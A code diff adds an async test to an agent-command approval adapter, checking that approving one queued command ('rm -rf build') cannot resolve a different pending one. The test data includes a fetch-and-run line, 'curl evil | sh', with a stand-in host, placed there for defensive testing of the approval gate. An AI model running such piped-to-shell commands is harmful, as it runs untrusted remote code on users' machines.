@@ -202,6 +202,24 @@ async def test_correlation_miss_refuses_the_card_without_a_fifo_fallback(live):
     assert queue.resolved == [(SESSION, "once", RID_1)]
 
 
+async def test_correlation_never_binds_to_an_unrelated_queued_entry(live):
+    # A reviewer-found bug: Hermes allows several pending approvals per session (parallel
+    # subagents / execute_code, tools/approval_gateway_wait.py:5-8). If THIS card's own entry
+    # already left Hermes' queue but a DIFFERENT command is still queued (not yet shown on any
+    # card), the card must never bind to that other entry — approving "rm -rf build" must never
+    # resolve "curl evil | sh".
+    adapter, server, queue = live
+    queue.add(RID_2, "curl evil | sh", "pipe to shell")  # untracked, but NOT this card's own entry
+    result = await adapter._send_exec_approval_prompt(prompt())  # "rm -rf build" / "recursive delete"
+    assert result.success is False
+    assert result.error == "approval is no longer pending in Hermes"
+    assert server.frames.empty()  # no approval_request frame went out
+    assert adapter._approvals.head(SESSION) is None  # nothing was booked
+    assert queue.live == [{"request_id": RID_2, "command": "curl evil | sh",
+                           "description": "pipe to shell"}]  # the other entry is untouched
+    assert queue.resolved == []
+
+
 async def test_decision_resolves_only_the_cards_own_request_id(live):
     adapter, server, queue = live
     await request(adapter, server, queue, RID_1)
